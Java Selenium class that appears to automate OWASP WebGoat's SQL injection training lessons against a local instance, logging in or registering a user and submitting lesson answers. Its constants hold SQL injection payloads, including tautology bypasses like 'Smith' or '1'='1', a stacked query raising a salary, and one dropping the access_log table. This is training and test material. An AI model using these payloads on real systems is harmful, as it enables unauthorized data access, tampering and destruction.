package org.owasp.webgoat;

import java.util.concurrent.TimeUnit;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;

public class WebGoatSQLIntro {

	private static final String sql_2 = "select department from employees where last_name='Franco'";
	private static final String sql_3 = "update employees set department='Sales' where last_name='Barnett'";
	private static final String sql_4_drop = "alter table employees drop column phone";
	private static final String sql_4_add = "alter table employees add column phone varchar(20)";
	private static final String sql_5 = "grant alter table to UnauthorizedUser";
	private static final String sql_9_account = " ' ";
	private static final String sql_9_operator = "or";
	private static final String sql_9_injection = "'1'='1";
	private static final String sql_10_login_count = "2";
	private static final String sql_10_userid = "1 or 1=1";

	private static final String sql_11_a = "Smith' or '1' = '1";
	private static final String sql_11_b = "3SL99A'  or '1'='1";

	private static final String sql_12_a = "Smith";
	private static final String sql_12_b = "3SL99A' ; update employees set salary= '100000' where last_name='Smith";

	private static final String sql_13 = "%update% '; drop table access_log ; --'";

	private SeleniumConfig config;
	private String url = "http://127.0.0.1:8080/WebGoat";

	public WebGoatSQLIntro(boolean headless) {
		config = new SeleniumConfig(headless);
		config.getDriver().get(url);
	}

	public void closeWindow() {
		this.config.getDriver().close();
	}

	public String getTitle() {
		return this.config.getDriver().getTitle();
	}

	public void login(String un, String pw) {
		WebDriver driver = this.config.getDriver();

		driver.get(url + "/login");
		driver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);

		// Login
		driver.findElement(By.name("username")).sendKeys(un);
		driver.findElement(By.name("password")).sendKeys(pw);
		driver.findElement(By.className("btn")).click();

		// Check if user exists. If not, create user.
		if (driver.getCurrentUrl().equals(url + "/login?error")) {
			driver.get(url + "/registration");
			driver.findElement(By.id("username")).sendKeys(un);
			driver.findElement(By.id("password")).sendKeys(pw);
			driver.findElement(By.id("matchingPassword")).sendKeys(pw);
			driver.findElement(By.name("agree")).click();
			driver.findElement(By.className("btn-primary")).click();
		}

	}

	public void exercise() {
		WebDriver driver = this.config.getDriver();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson");
		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/1");
		driver.findElement(By.id("restart-lesson-button")).click();
		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/0");
		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/1");
		driver.findElement(By.name("query")).sendKeys(sql_2);
		driver.findElement(By.name("query")).submit();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/2");
		driver.findElements(By.name("query")).get(1).sendKeys(sql_3);
		driver.findElements(By.name("query")).get(1).submit();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/3");
		driver.findElements(By.name("query")).get(2).sendKeys(sql_4_drop);
		driver.findElements(By.name("query")).get(2).submit();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/3");
		driver.findElements(By.name("query")).get(2).clear();
		driver.findElements(By.name("query")).get(2).sendKeys(sql_4_add);
		driver.findElements(By.name("query")).get(2).submit();
		driver.findElements(By.name("query")).get(2).clear();
		driver.findElements(By.name("query")).get(2).sendKeys(sql_4_drop);
		driver.findElements(By.name("query")).get(2).submit();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/4");
		driver.findElements(By.name("query")).get(3).sendKeys(sql_5);
		driver.findElements(By.name("query")).get(3).submit();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/8");
		driver.findElement(By.name("account")).sendKeys("Smith'");
		driver.findElement(By.name("operator")).sendKeys("OR");
		driver.findElement(By.name("injection")).sendKeys("'1'='1");
		driver.findElement(By.name("Get Account Info")).click();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/9");
		driver.findElement(By.name("userid")).sendKeys(sql_10_userid);
		driver.findElement(By.name("login_count")).sendKeys(sql_10_login_count);
		driver.findElements(By.name("Get Account Info")).get(1).click();
	}

}
